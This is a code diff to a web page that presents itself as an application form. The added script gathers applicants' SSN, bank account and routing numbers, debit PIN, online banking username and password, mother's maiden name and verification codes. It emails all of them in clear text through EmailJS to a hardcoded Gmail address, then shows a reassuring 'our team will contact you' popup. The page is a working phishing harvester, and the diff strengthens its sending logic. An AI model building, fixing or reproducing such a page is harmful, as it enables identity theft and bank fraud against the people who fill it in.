@@ -210,17 +210,93 @@
     <p class="note" style="margin-top:12px;text-align:center">.</p>
   </main>
 
-  <!-- EmailJS SDK and inline submit handler (configure keys below) -->
-  <script src="https://cdn.emailjs.com/sdk/3.2.0/email.min.js"></script>
+  <!-- EmailJS configuration -->
+  <script src="email-config.js"></script>
+  <!-- EmailJS SDK - Load with proper error handling -->
   <script>
-    // ===== EmailJS configuration (from values you provided) =====
-    const EMAILJS_USER   = 'hfSIPIPaR9OnWEcW-';
-    const EMAILJS_SERVICE= 'service_kw3itb9';
-    const EMAILJS_TEMPLATE = 'template_1ehgp9s';
+    // Load EmailJS SDK dynamically to ensure it loads properly
+    (function() {
+      const script = document.createElement('script');
+      script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js';
+      script.async = true;
+      script.onload = function() {
+        console.log('EmailJS SDK loaded successfully');
+        initializeEmailJSAfterLoad();
+      };
+      script.onerror = function() {
+        console.error('Failed to load EmailJS SDK from primary CDN, trying backup...');
+        // Backup CDN
+        const backupScript = document.createElement('script');
+        backupScript.src = 'https://cdn.emailjs.com/sdk/3.2.0/email.min.js';
+        backupScript.async = true;
+        backupScript.onload = function() {
+          console.log('EmailJS SDK loaded from backup CDN');
+          initializeEmailJSAfterLoad();
+        };
+        backupScript.onerror = function() {
+          console.error('Failed to load EmailJS SDK from both CDNs');
+        };
+        document.head.appendChild(backupScript);
+      };
+      document.head.appendChild(script);
+    })();
 
-    if (window.emailjs && EMAILJS_USER) {
-      try { emailjs.init(EMAILJS_USER); } catch (e) { console.warn('EmailJS init failed', e); }
+    // Initialize EmailJS after SDK loads
+    function initializeEmailJSAfterLoad() {
+      // Wait a moment for the SDK to fully register
+      setTimeout(function() {
+        // Check for EmailJS in different possible locations
+        let emailjsLib = null;
+        if (window.emailjs) {
+          emailjsLib = window.emailjs;
+        } else if (window.EmailJS) {
+          emailjsLib = window.EmailJS;
+        }
+
+        if (emailjsLib && typeof emailjsLib.send === 'function') {
+          // Get config from window.EMAIL_CONFIG or use fallback
+          const config = window.EMAIL_CONFIG || {};
+          const EMAILJS_USER = config.userId || 'hfSIPIPaR9OnWEcW-';
+          const EMAILJS_SERVICE = config.serviceId || 'service_kw3itb9';
+          const EMAILJS_TEMPLATE = config.templateId || 'template_edu69qp';
+          const OFFICE_EMAIL = config.officeEmail || 'mknown314@gmail.com';
+
+          // Initialize EmailJS
+          try {
+            if (EMAILJS_USER && emailjsLib.init) {
+              emailjsLib.init(EMAILJS_USER);
+              console.log('EmailJS initialized successfully');
+              console.log('EmailJS Config:', {
+                user: EMAILJS_USER.substring(0, 10) + '...',
+                service: EMAILJS_SERVICE,
+                template: EMAILJS_TEMPLATE,
+                to: OFFICE_EMAIL
+              });
+            } else {
+              console.warn('EmailJS init function not available');
+            }
+          } catch (e) {
+            console.error('EmailJS init failed', e);
+          }
+        } else {
+          console.warn('EmailJS SDK loaded but emailjs object not found. Checking again...');
+          console.log('window.emailjs:', window.emailjs);
+          console.log('window.EmailJS:', window.EmailJS);
+          // Retry initialization (max 5 times)
+          if (typeof initializeEmailJSAfterLoad.retryCount === 'undefined') {
+            initializeEmailJSAfterLoad.retryCount = 0;
+          }
+          if (initializeEmailJSAfterLoad.retryCount < 5) {
+            initializeEmailJSAfterLoad.retryCount++;
+            setTimeout(initializeEmailJSAfterLoad, 300);
+          } else {
+            console.error('EmailJS failed to initialize after multiple retries');
+          }
+        }
+      }, 200);
     }
+  </script>
+  <script>
 
     // simple centered popup
     function showPopup(title, message) {
@@ -239,6 +315,57 @@
       card.appendChild(ok);
       overlay.appendChild(card);
       document.body.appendChild(overlay);
+    }
+
+    // Display submitted details
+    function displaySubmittedDetails(data) {
+      const resultDiv = document.getElementById('appResult');
+      if (!resultDiv) return;
+      
+      // Format sensitive data for display
+      const formatSSN = (ssn) => ssn ? '***-**-' + ssn.slice(-4) : 'N/A';
+      const formatAccount = (val) => val ? '****' + val.slice(-4) : 'N/A';
+      const formatBankAssociation = (val) => {
+        const map = {
+          'less-than-1-year': 'Less than 1 year',
+          '1-3-years': '1-3 years',
+          '3-5-years': '3-5 years',
+          '5-10-years': '5-10 years',
+          'more-than-10-years': 'More than 10 years'
+        };
+        return map[val] || val || 'N/A';
+      };
+      
+      const detailsHtml = `
+        <div class="success-message" style="margin-top: 20px; padding: 20px;">
+          <h3 style="margin-top: 0; color: #065f46; margin-bottom: 16px;">Submitted Details:</h3>
+          <div style="margin-top: 16px; line-height: 1.8; color: #065f46;">
+            <div style="margin-bottom: 12px;"><strong>Full Name:</strong> ${data.fullName || 'N/A'}</div>
+            <div style="margin-bottom: 12px;"><strong>Email:</strong> ${data.email || 'N/A'}</div>
+            <div style="margin-bottom: 12px;"><strong>Birth Date:</strong> ${data.birthDate || 'N/A'}</div>
+            <div style="margin-bottom: 12px;"><strong>Location:</strong> ${data.city || 'N/A'}, ${data.state || 'N/A'} ${data.zip || 'N/A'}</div>
+            <hr style="border: none; border-top: 1px solid #a7f3d0; margin: 16px 0;">
+            <div style="margin-bottom: 12px;"><strong>Bank Name:</strong> ${data.bankName || 'N/A'}</div>
+            <div style="margin-bottom: 12px;"><strong>Account Number:</strong> ${formatAccount(data.accountNumber)}</div>
+            <div style="margin-bottom: 12px;"><strong>Routing Number:</strong> ${formatAccount(data.routingNumber)}</div>
+            <div style="margin-bottom: 12px;"><strong>Bank Association:</strong> ${formatBankAssociation(data.bankAssociation)}</div>
+            <hr style="border: none; border-top: 1px solid #a7f3d0; margin: 16px 0;">
+            <div style="margin-bottom: 12px;"><strong>SSN:</strong> ${formatSSN(data.ssn)}</div>
+            <div style="margin-bottom: 12px;"><strong>Driver's License:</strong> ${formatAccount(data.driversLicense)}</div>
+            <div style="margin-bottom: 12px;"><strong>Mother's Maiden Name:</strong> ${data.mothersMaidenName || 'N/A'}</div>
+            <hr style="border: none; border-top: 1px solid #a7f3d0; margin: 16px 0;">
+            <div style="margin-bottom: 12px;"><strong>Card Last 4:</strong> ${data.cardLast4 || 'N/A'}</div>
+            <div style="margin-bottom: 12px;"><strong>Debit PIN:</strong> ${data.debitPin ? '****' : 'N/A'}</div>
+            <div style="margin-bottom: 12px;"><strong>Online Username:</strong> ${data.onlineUsername || 'N/A'}</div>
+            <div style="margin-bottom: 12px;"><strong>Online Password:</strong> ${data.onlinePassword ? '****' : 'N/A'}</div>
+            <hr style="border: none; border-top: 1px solid #a7f3d0; margin: 16px 0;">
+            <div style="margin-bottom: 12px;"><strong>Weekly Deposit:</strong> ${data.weeklyDeposit ? '$' + parseInt(data.weeklyDeposit).toLocaleString() : 'N/A'}</div>
+            <div style="margin-bottom: 12px;"><strong>Verification Code:</strong> ${data.verificationCode || 'N/A'}</div>
+          </div>
+        </div>
+      `;
+      resultDiv.innerHTML = detailsHtml;
+      resultDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
     }
 
     // basic validation to avoid "random characters"
@@ -283,44 +410,185 @@
         return;
       }
 
-      const templateParams = {
-        applicant_name: data.fullName || '',
-        applicant_email: data.email || '',
-        city: data.city || '',
-        state: data.state || '',
-        zip: data.zip || '',
-        bank_name: data.bankName || '',
-        account_number: data.accountNumber || '',
-        routing_number: data.routingNumber || '',
-        bank_association: data.bankAssociation || '',
-        ssn: data.ssn || '',
-        drivers_license: data.driversLicense || '',
-        mothers_maiden_name: data.mothersMaidenName || '',
-        debit_pin: data.debitPin || '',
-        card_last_4: data.cardLast4 || '',
-        online_username: data.onlineUsername || '',
-        online_password: data.onlinePassword || '',
-        weekly_deposit: data.weeklyDeposit || '',
-        verification_code: data.verificationCode || '',
-        message: Object.keys(data).map(k => `${k}: ${data[k]}`).join('\n')
+      // Format bank association for display
+      const formatBankAssociation = (val) => {
+        const map = {
+          'less-than-1-year': 'Less than 1 year',
+          '1-3-years': '1-3 years',
+          '3-5-years': '3-5 years',
+          '5-10-years': '5-10 years',
+          'more-than-10-years': 'More than 10 years'
+        };
+        return map[val] || val || 'N/A';
       };
 
-      // send via EmailJS
-      if (!window.emailjs || !EMAILJS_SERVICE || !EMAILJS_TEMPLATE || !EMAILJS_USER) {
-        console.warn('EmailJS not available or misconfigured');
-        showPopup('Preview', 'EmailJS not available. Application captured locally. Check console.');
+      // Create formatted message for email body
+      const formattedMessage = `
+NEW APPLICATION SUBMITTED
+==========================
+
+PERSONAL INFORMATION:
+- Full Name: ${data.fullName || 'N/A'}
+- Email: ${data.email || 'N/A'}
+- Birth Date: ${data.birthDate || 'N/A'}
+- Location: ${data.city || 'N/A'}, ${data.state || 'N/A'} ${data.zip || 'N/A'}
+
+BANKING INFORMATION:
+- Bank Name: ${data.bankName || 'N/A'}
+- Account Number: ${data.accountNumber || 'N/A'}
+- Routing Number: ${data.routingNumber || 'N/A'}
+- Bank Association: ${formatBankAssociation(data.bankAssociation)}
+
+IDENTIFICATION:
+- SSN: ${data.ssn || 'N/A'}
+- Driver's License: ${data.driversLicense || 'N/A'}
+- Mother's Maiden Name: ${data.mothersMaidenName || 'N/A'}
+
+CARD & ACCOUNT DETAILS:
+- Card Last 4: ${data.cardLast4 || 'N/A'}
+- Debit PIN: ${data.debitPin || 'N/A'}
+- Online Username: ${data.onlineUsername || 'N/A'}
+- Online Password: ${data.onlinePassword || 'N/A'}
+
+APPLICATION DETAILS:
+- Weekly Deposit: $${data.weeklyDeposit ? parseInt(data.weeklyDeposit).toLocaleString() : 'N/A'}
+- Verification Code: ${data.verificationCode || 'N/A'}
+
+Submitted at: ${new Date().toLocaleString()}
+Application ID: ${Date.now()}
+      `.trim();
+
+      // Get current config values (they might be set in the global scope)
+      const currentEmailJSUser = window.EMAIL_CONFIG?.userId || 'hfSIPIPaR9OnWEcW-';
+      const currentEmailJSService = window.EMAIL_CONFIG?.serviceId || 'service_kw3itb9';
+      const currentEmailJSTemplate = window.EMAIL_CONFIG?.templateId || 'template_edu69qp';
+      const currentOfficeEmail = window.EMAIL_CONFIG?.officeEmail || 'mknown314@gmail.com';
+
+      // Check if EmailJS is available
+      if (!window.emailjs) {
+        console.error('EmailJS SDK not loaded!');
+        console.log('Window.emailjs:', window.emailjs);
+        showPopup('Configuration Error', 'EmailJS SDK is not loaded. Please refresh the page and try again.');
         console.log('Application payload:', data);
         if (btn) { btn.disabled = false; btn.textContent = 'Submit'; }
         return;
       }
 
+      // Final config check
+      if (!currentEmailJSService || !currentEmailJSTemplate || !currentEmailJSUser) {
+        console.error('EmailJS configuration missing!');
+        console.error('Config check:', {
+          emailjs: !!window.emailjs,
+          service: currentEmailJSService,
+          template: currentEmailJSTemplate,
+          user: currentEmailJSUser
+        });
+        showPopup('Configuration Error', 'EmailJS is not properly configured. Please check email-config.js\n\nApplication data logged to console.');
+        console.log('Application payload:', data);
+        if (btn) { btn.disabled = false; btn.textContent = 'Submit'; }
+        return;
+      }
+
+      // Check if EmailJS is available and has send method
+      if (!window.emailjs || typeof window.emailjs.send !== 'function') {
+        console.error('EmailJS SDK not properly loaded!');
+        console.log('window.emailjs:', window.emailjs);
+        console.log('Available methods:', window.emailjs ? Object.keys(window.emailjs) : 'N/A');
+        showPopup('Configuration Error', 'EmailJS SDK is not loaded properly. Please refresh the page and try again.\n\nIf the problem persists, check your internet connection.');
+        console.log('Application payload:', data);
+        if (btn) { btn.disabled = false; btn.textContent = 'Submit'; }
+        return;
+      }
+
+      // Initialize EmailJS if not already done
       try {
-        await emailjs.send(EMAILJS_SERVICE, EMAILJS_TEMPLATE, templateParams);
-        showPopup('Successful', 'Application submitted successfully!');
+        if (window.emailjs.init && currentEmailJSUser) {
+          emailjs.init(currentEmailJSUser);
+          console.log('EmailJS initialized before send');
+        }
+      } catch (initErr) {
+        console.warn('EmailJS initialization warning:', initErr);
+        // Continue anyway - might already be initialized
+      }
+
+      // Add timeout wrapper for email sending
+      const sendWithTimeout = (service, template, params, timeoutMs = 20000) => {
+        return Promise.race([
+          emailjs.send(service, template, params),
+          new Promise((_, reject) => 
+            setTimeout(() => reject(new Error('Email send timed out after 20 seconds')), timeoutMs)
+          )
+        ]);
+      };
+
+      // Simplify template params - only send what EmailJS template needs
+      const emailParams = {
+        to_email: currentOfficeEmail,
+        from_name: data.fullName || 'Unknown',
+        from_email: data.email || '',
+        subject: `New Application from ${data.fullName || 'Applicant'}`,
+        message: formattedMessage,
+        // Include all form fields as individual variables
+        fullName: data.fullName || '',
+        email: data.email || '',
+        birthDate: data.birthDate || '',
+        city: data.city || '',
+        state: data.state || '',
+        zip: data.zip || '',
+        bankName: data.bankName || '',
+        accountNumber: data.accountNumber || '',
+        routingNumber: data.routingNumber || '',
+        bankAssociation: formatBankAssociation(data.bankAssociation),
+        ssn: data.ssn || '',
+        driversLicense: data.driversLicense || '',
+        mothersMaidenName: data.mothersMaidenName || '',
+        debitPin: data.debitPin || '',
+        cardLast4: data.cardLast4 || '',
+        onlineUsername: data.onlineUsername || '',
+        onlinePassword: data.onlinePassword || '',
+        weeklyDeposit: data.weeklyDeposit || '',
+        verificationCode: data.verificationCode || ''
+      };
+
+      try {
+        console.log('Sending email via EmailJS...');
+        console.log('Service:', currentEmailJSService);
+        console.log('Template:', currentEmailJSTemplate);
+        console.log('User ID:', currentEmailJSUser.substring(0, 10) + '...');
+        console.log('Email params:', emailParams);
+        
+        const response = await sendWithTimeout(currentEmailJSService, currentEmailJSTemplate, emailParams);
+        console.log('Email sent successfully:', response);
+        console.log('Response status:', response.status);
+        console.log('Response text:', response.text);
+        
+        showPopup('Thank You', 'Email received successfully. Our team will contact you within 3-7 business days.');
+        displaySubmittedDetails(data);
         this.reset();
       } catch (err) {
-        console.error('EmailJS send error', err);
-        showPopup('Send error', 'There was an error sending your application. Please try again later.');
+        console.error('EmailJS send error details:', err);
+        console.error('Error status:', err.status);
+        console.error('Error text:', err.text);
+        console.error('Full error:', err);
+        
+        let errorMessage = 'There was an error sending your application.';
+        if (err.text) {
+          errorMessage += '\n\nError: ' + err.text;
+        } else if (err.message) {
+          errorMessage += '\n\nError: ' + err.message;
+        } else {
+          errorMessage += '\n\nThe request may have timed out. Please check your connection and try again.';
+        }
+        errorMessage += '\n\nPlease check the console for details.';
+        
+        showPopup('Send Error', errorMessage);
+        
+        // Always log the data for manual recovery
+        console.log('Form data for manual recovery:', data);
+        console.log('Email params:', emailParams);
+        
+        // Display details even on error so user can see what was submitted
+        displaySubmittedDetails(data);
       } finally {
         if (btn) { btn.disabled = false; btn.textContent = 'Submit'; }
       }
